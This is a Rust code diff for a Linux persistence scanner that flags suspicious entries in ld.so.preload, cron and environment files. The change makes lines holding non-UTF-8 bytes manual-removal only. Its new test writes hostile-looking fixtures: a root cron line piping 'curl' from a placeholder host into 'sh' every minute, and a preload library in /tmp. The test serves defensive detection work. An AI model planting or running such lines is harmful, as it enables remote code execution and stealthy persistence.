@@ -2044,6 +2044,9 @@ struct Lancements {
     /// Ce que Vanguard n'a pas pu lire (ronde 7 de la 0.95 : un fichier d'uwsm qui n'a pas que des lignes simples),
     /// avec ce qu'il faut récrire : un constat non vérifié à part (`constat_non_verifie`), jamais levé ni sain.
     non_verifies: Vec<String>,
+    /// Une ligne signalée lue avec pertes (octet hors UTF-8) : un geste ne la désigne pas (le fils root la cherche
+    /// par l'empreinte de ses octets, que la ligne lue n'a plus), elle reste à la main et c'est dit (lot 096, N4).
+    hors_utf8: bool,
     r: Releveur,
 }
 
@@ -2513,6 +2516,17 @@ struct Lecture {
     octets: Vec<u8>,
     texte: String,
     entier: bool,
+    /// Le fichier est du texte UTF-8 : `texte` a les mêmes octets que `octets`.
+    utf8: bool,
+}
+
+impl Lecture {
+    /// Une ligne de `texte` qu'un geste peut désigner : ses octets sont ceux du fichier. Hors UTF-8, une ligne sans
+    /// U+FFFD n'a rien perdu ; une ligne qui en a un a peut-être perdu un octet (un vrai U+FFFD dans un fichier hors
+    /// UTF-8 reste aussi à la main : dans le doute, pas de geste).
+    fn designable(&self, ligne: &str) -> bool {
+        self.utf8 || !ligne.contains('\u{FFFD}')
+    }
 }
 
 /// Lit un fichier de démarrage ou de configuration, borné (`temoins::lire_borne` : jamais un tube, un périphérique
@@ -2529,8 +2543,12 @@ fn lire(f: &Path, h: &Path, t: &mut Lancements) -> Option<Lecture> {
                     tr!("trop gros pour être lu en entier", "too large to be read in full"),
                 );
             }
+            let texte = String::from_utf8_lossy(&lu.octets);
+            let utf8 = matches!(texte, std::borrow::Cow::Borrowed(_));
+            let texte = texte.into_owned();
             Some(Lecture {
-                texte: String::from_utf8_lossy(&lu.octets).into_owned(),
+                utf8,
+                texte,
                 entier: lu.entier,
                 octets: lu.octets,
             })
@@ -6943,9 +6961,15 @@ fn telle_qu_ecrite(texte: &str, l: &str) -> String {
         .to_string()
 }
 
-/// Le fichier et la ligne à retirer, pour `Lancements::retraits`.
-fn retrait(f: &Path, texte: &str, l: &str) -> Option<(String, String)> {
-    Some((f.to_str()?.to_string(), telle_qu_ecrite(texte, l)))
+/// Le fichier et la ligne à retirer, pour `Lancements::retraits` ; `None` (à la main) pour une ligne qu'un geste ne
+/// désigne pas, hors UTF-8 (`Lancements::hors_utf8`).
+fn retrait(t: &mut Lancements, f: &Path, lu: &Lecture, l: &str) -> Option<(String, String)> {
+    let ecrite = telle_qu_ecrite(&lu.texte, l);
+    if !lu.designable(&ecrite) {
+        t.hors_utf8 = true;
+        return None;
+    }
+    Some((f.to_str()?.to_string(), ecrite))
 }
 
 /// /etc/ld.so.preload : chaque bibliothèque listée est chargée dans TOUS les programmes, root compris. Technique
@@ -6973,8 +6997,13 @@ fn lire_prechargement(
             let connue = possede(Path::new(std::ffi::OsStr::from_bytes(&p.nom)));
             let lib = String::from_utf8_lossy(&p.nom);
             t.sources.push(source_de("preload", &lib));
-            t.retraits
-                .push(preload.to_str().map(|f| (f.to_string(), ligne.to_string())));
+            let r = if lu.designable(ligne) {
+                preload.to_str().map(|f| (f.to_string(), ligne.to_string()))
+            } else {
+                t.hors_utf8 = true;
+                None
+            };
+            t.retraits.push(r);
             let d = designes::bibliotheques(&lib, designes::Liste::Fichier);
             let temoin = temoin_de_ligne(t, &preload, p.ligne, &lu, ligne, d, false, Sorte::Shell);
             t.temoins.push(temoin);
@@ -8199,11 +8228,12 @@ fn juger_posees_d_environment_d(
                     let ecrite = physiques.first().map_or(jointe.as_str(), |(_, l)| l.as_str());
                     t.sources
                         .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), &jointe));
-                    t.retraits.push(if physiques.len() == 1 {
-                        retrait(f, &lu.texte, ecrite)
+                    let retire = if physiques.len() == 1 {
+                        retrait(t, f, lu, ecrite)
                     } else {
                         None
-                    });
+                    };
+                    t.retraits.push(retire);
                     let d = designes::commande(&jointe, designes::Contexte::Shell);
                     let temoin = temoin_de_ligne(t, f, n.saturating_sub(1), lu, &jointe, d, true, Sorte::Shell);
                     t.temoins.push(temoin);
@@ -8256,7 +8286,8 @@ fn juger_lignes_de_configuration(
         if prechargement_selon(l, sorte) {
             t.sources
                 .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
-            t.retraits.push(retrait(f, &lu.texte, ecrite));
+            let retire = retrait(t, f, lu, ecrite);
+            t.retraits.push(retire);
             let d = designes::prechargement(l);
             let temoin = temoin_de_ligne(t, f, n, lu, l, d, false, Sorte::Shell);
             t.temoins.push(temoin);
@@ -8301,7 +8332,8 @@ fn juger_lignes_de_configuration(
         {
             t.sources
                 .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), l));
-            t.retraits.push(retrait(f, &lu.texte, ecrite));
+            let retire = retrait(t, f, lu, ecrite);
+            t.retraits.push(retire);
             let d = designes::commande(l, designes::Contexte::Shell);
             let temoin = temoin_de_ligne(t, f, n, lu, l, d, true, Sorte::Shell);
             t.temoins.push(temoin);
@@ -8344,6 +8376,9 @@ fn juger_caches_d_uwsm(caches: &[std::path::PathBuf], h: &Path, t: &mut Lancemen
         if cache.refuse {
             continue;
         }
+        // Fusion 0.96 (N4 sur N9-3) : sans raison de non-lecture, `texte` a les octets du fichier ; sinon (NUL retiré,
+        // hors UTF-8, …) une ligne ne se désigne que sans perte visible (`Lecture::designable`).
+        let fidele = cache.non_lu.is_none();
         if let Some(raison) = cache.non_lu {
             let ou = court(f, h);
             t.non_verifies.push(trf!(
@@ -8355,6 +8390,7 @@ fn juger_caches_d_uwsm(caches: &[std::path::PathBuf], h: &Path, t: &mut Lancemen
             octets: cache.texte.as_bytes().to_vec(),
             texte: cache.texte,
             entier: true,
+            utf8: fidele,
         };
         let avant = t.suspects.len();
         let non_verifies_avant = t.non_verifies.len();
@@ -12237,8 +12273,8 @@ fn lever(
 ) {
     t.sources
         .push(source_de(&crate::modele::id::chemin(&f.to_string_lossy()), ligne));
-    t.retraits
-        .push(if retirable { retrait(f, &lu.texte, ligne) } else { None });
+    let r = if retirable { retrait(t, f, lu, ligne) } else { None };
+    t.retraits.push(r);
     let maison = maison_texte(t);
     let designe = if ambigue {
         Designe::Indefini(designes::Flou::Syntaxe)
@@ -13537,7 +13573,8 @@ fn juger_cron(racine: &Path, crontab: Option<String>, t: &mut Lancements) {
         for (n, l) in lu.texte.lines().enumerate().filter(|(_, l)| !commentaire(l)) {
             if let Some(raison) = commande_suspecte(l, false) {
                 t.sources.push(source_de(&crate::modele::id::chemin(&source), l));
-                t.retraits.push(retrait(&f, &lu.texte, l));
+                let r = retrait(t, &f, &lu, l);
+                t.retraits.push(r);
                 let d = designes::commande(&commande_de_cron(l, true), designes::Contexte::Shell);
                 let temoin = temoin_de_ligne(t, &f, n, &lu, l, d, true, Sorte::Shell);
                 t.temoins.push(temoin);
@@ -13676,6 +13713,7 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         temoins: releves,
         mut informations,
         mut notes,
+        hors_utf8,
         ..
     } = t;
     suspects.sort();
@@ -13730,6 +13768,12 @@ fn constat_des_lancements(t: Lancements) -> Constat {
         );
     }
     message.push('.');
+    if hors_utf8 {
+        message.push_str(tr!(
+            " Une ligne signalée n'est pas du texte UTF-8 : un geste ne peut pas la désigner, tout est à retirer à la main.",
+            " A reported line is not UTF-8 text: no action can point at it, everything is to be removed by hand."
+        ));
+    }
     if let Some(a) = a_savoir {
         message.push_str(&a);
     }
@@ -19447,6 +19491,33 @@ mod tests {
             let fichier = m.racine.join("etc/ld.so.preload").to_str().unwrap().to_string();
             let ligne = String::from_utf8(nom.to_vec()).unwrap();
             assert_eq!(t.retraits, vec![Some((fichier, ligne))], "{contenu:?}");
+        }
+    }
+
+    /// Ronde 3 du lot 096 (N4) : une ligne signalée qui porte un octet hors UTF-8 ne se désigne pas au fils root (il
+    /// la cherche par l'empreinte de ses octets, et la ligne lue avec pertes n'a plus ces octets-là) : la correction
+    /// reste à la main, et c'est dit. Avant, « Retirer ces lignes » était offert, le fils ne trouvait rien et
+    /// répondait « déjà fait ». Témoin : la même ligne en UTF-8 se retire par geste.
+    #[test]
+    fn ligne_hors_utf8_a_la_main() {
+        for (i, (lieu, octets, designable)) in [
+            ("etc/ld.so.preload", &b"/tmp/.x/\xff.so\n"[..], false),
+            ("etc/ld.so.preload", b"/tmp/.x/l.so\n", true),
+            ("etc/cron.d/maj", b"* * * * * root curl http://exemple.test/\xff | sh\n", false),
+            ("etc/cron.d/maj", b"* * * * * root curl http://exemple.test/x | sh\n", true),
+        ]
+        .into_iter()
+        .enumerate()
+        {
+            let m = Maison::nouvelle(&format!("hors-utf8-{i}"));
+            let f = m.racine.join(lieu);
+            std::fs::create_dir_all(f.parent().unwrap()).unwrap();
+            std::fs::write(&f, octets).unwrap();
+            let c = m.lancements();
+            leve(&c, lieu);
+            let auto = c.correctif.as_ref().is_some_and(|k| k.automatique);
+            assert_eq!(auto, designable, "{lieu} {octets:?} : {}", c.message);
+            assert!(designable || c.message.contains("à la main"), "{}", c.message);
         }
     }
 
